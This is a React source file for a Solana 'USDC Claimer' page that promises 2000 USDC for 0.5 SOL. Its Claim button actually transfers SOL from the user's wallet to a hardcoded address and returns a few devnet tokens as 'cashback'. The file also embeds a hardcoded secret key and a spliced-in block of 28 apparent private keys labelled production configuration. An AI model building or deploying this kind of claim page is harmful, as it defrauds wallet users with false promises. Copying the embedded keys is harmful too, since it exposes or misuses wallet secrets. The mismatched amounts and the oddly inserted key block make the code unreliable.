/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "44SaPa5usWzLweLczEEDSvjnFNwsF76uf762qfXXssKLxNnk7XycXbpoxcPwU6u2ftsZtvzdHiXruXNvWQooGhV7"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "45uEuehwS9mPirfDNyB4tQARFWDZyujspRuYm8CN78eh15iMFuiKzQNYhq3cb7GwiqKhr9wGQcoWcbnsfZf6eSZh",
  "key1": "3aZMgUjsHimuMgopgNQ5V5pA8MWTQ3sKNsDPwFuJb3C853trnCvMiPVTLN7hieyJdaavdVfdXCxpRYD8q3Kc9q8X",
  "key2": "DP9iaCg7kBEvXqnV1uQ1ZSiBdXy8H2nwUbHdo8USzW6onKLUUebAfP9VdTxrKdEEd3rk2pi3n8EC6v9ADweBQ1k",
  "key3": "24SExL2G7GNP836cfDveRvhrrKPfE235x9XUemxJL9QJ46P2Pd8qhNrqq7ccLizBZYJeFjbU7Tv6sLL3PTvZhBtU",
  "key4": "382omVcmyikB1H7S1khpWuaJrYwGXSzdQAFoP7ogieNHwhrSZrJy3Cyv8qhTAPwh4HKyTRUnz2huAzgEbTk2LCJJ",
  "key5": "2PcqRy2aEwHGb3hxJf99pgcKJL48YkkJpnoUyJB3sz5HxN2FydorXhzeq9XpR1K4DnQVY1WDYpGqDsr2ybZ4zUgh",
  "key6": "mznQbkTUqt49PzavPkr4VqZnqcY7t2ieFrUbmc6shfs6rqvtifJn58aAerutTAAeK7qVVAxAdHFQNnTHejJkSAY",
  "key7": "5oHLXQuoCf1fPp5SpKnMRpbNcJQiATSCsV84PWzf1phfER1Dt9QrxXascwdvgisbZcFWx6VMtNyAf14kfLLBH8R8",
  "key8": "HGu9BvJsYcH52J1uswSAswXtDcLBPS8xGBQ8yB3oymLTgF6NyPZNwWZzTkTF7w7oJGxC7QU6U5dMrFQGd7M5idz",
  "key9": "9M7wdETEfUAvXn1ZLKxnxRfg5XSi8cszouKQcvQ3fZ7AGHfoTXpmpoE4iy1vSHpNTJ6Rtfmz8H4QoRYQ9ZTPbKr",
  "key10": "VXMMDwMgVfXvGinvdLDDXq5KiceupmA9Ayjae3N4XwfwL2CMjRD12udBo5dazYZLxsznTiuGi4iSMBE6CJ3xUX4",
  "key11": "21fq44x8Y3t3VGJftQTLumsVWgAnd4Q5eKAvSvjUtfUowJohyvpSEhJNBkPRugF3W7vBGRZ5THwQpQLaBzC39vN9",
  "key12": "2EbbGKUdeVcgQoEjM8p8KP9f5Uitt5t3RzmmP4nKZHhfB7f67SN6u82wwMcUMGQXuDSMh6hmoMK36wxiGJVXA7KJ",
  "key13": "3Nd9SFc94SdKgaRWWWugVt8cgbU7a68815peT996mYXfqsA8b1W4NSKFJx2rz5PH9eJEhyLJ1G9Z6X573H2zsBwd",
  "key14": "5xaBMdGC9E8DJ8tAPxo5xpZPLdsoXs4w8wrtBEeurh78pGSXMQEnLTk9h3tsdwU9NLf1qo89esBq3YJnWHKP69UG",
  "key15": "2toSReyCDm4X91UZ9qWb1GyC9zvcqNwHZndVAvMRv2sRCPtx7bdkPQaTc4wRw27VmcXMSWGpxDvVQaRm1UXd5Lm1",
  "key16": "3KusB9bcwGCxNwGRE58FMg5rEDC81Xo8eZBQPEzdoGtxmvULruAjUmRtWLeQ3F7rrUH3Y59qteJhWtRr4hVhHQnQ",
  "key17": "3E5xSMpKWTSskohfkEEKEzBuLD8GMxJtd3eapZr6TaJvW2cWWdQCyHHWtrY2Em5EN7RCthDdK4mpLFDnSUWdNrR",
  "key18": "5Q6jxBN6TvtwnvGBw1nsY9NEH1SoLSPpiA2dwTp3Hsc8DqMsBGCHsuuGDYHsK8uGDVHdc7oDv6tuQB5gubcvDMrX",
  "key19": "ZNR66NCTqrYz3Jpmw3aEgZR83XXS23Zvk2U3YM8j39WuXUqz3jx1hNrYsTQ8M3CckfUj3EJ35ze8jG2XZs8oV89",
  "key20": "3iHA3iW3ucj45r7wE4uPKo5zjF5Xv7geUyFRZHrgBZ4SvaRP3AVxmTWbE6keHptRGaMRyEQw9PsFf4uXGiGp6FKL",
  "key21": "47zSCLqDPaevvyCPs5oseXUSUsCagbbDRNhCLWY9VgMMV8dCzZk3WZcoEWytLfG1tS9aEqwyhV9BNBpBnvrJzRVX",
  "key22": "xbfbW2kmy3GrmKZK1rJvmkjehqMB17pt2zYKuBivEhvqx7NZ3rrC4gzs7QJ2tLQ4Dgbk5ebMf18mePPehaEfx9w",
  "key23": "4K5T9QSSF6zfrwpE1FnTkCughSbVe1eUmBxdDwDnjjovgDiNwZx8sgAqobRvhi2CKJVFFHGySWLYn75GsQhLuyYG",
  "key24": "2NmkdRK8LEBTvdh8Lp1Hoh3pxMFBqyc7i6dL6W3MWYgvv8EG2vo3iiGjDvABak3cnARFAiSk3YBAW5FLYRKP6bgs",
  "key25": "3cvtNW416jBTLetxmhUgZcHdwhihaga6zGWqkv3rXSdzcHUW2qZMUFZJk3Bw16hBXV87SEmob5EBdz885kwRWqCj",
  "key26": "3pzS5wqM92VqrZywMM375iAcqPdRZ4pjknsv9owof1T8a2Mx4wne9W5xbZwETC7jSL6MzeJnvdjTFi9s4oihqioR",
  "key27": "CxAt5SSK6Nc92yod45LEo5G2gVeB1eTZhyvP3SZadBVbKvBTuVmN4ZcAPu53bgKpqkpNQXZXrCyYgfso4jhcv3i"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
